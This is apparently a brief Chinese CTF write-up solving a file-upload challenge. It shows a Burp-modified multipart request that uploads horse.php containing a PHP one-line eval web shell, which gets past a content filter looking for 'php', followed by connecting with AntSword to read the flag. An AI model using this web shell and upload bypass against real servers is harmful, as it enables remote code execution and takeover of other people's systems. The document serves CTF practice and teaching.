# Web-1-Upload1

上传题，防护点为内容中的 `php` 会被识别到。

于是 burpsuite 抓包修改为

```http
Content-Disposition: form-data; name="file"; filename="horse.php"
Content-Type: image/jpeg

<?@eval($_REQUEST['x']);?>
```

修改文件拓展名为`.php`，内容为一句话木马。使用蚂剑连接，在根目录找到flag。

![](../../../assets/Pasted%20image%2020251108165308.png)


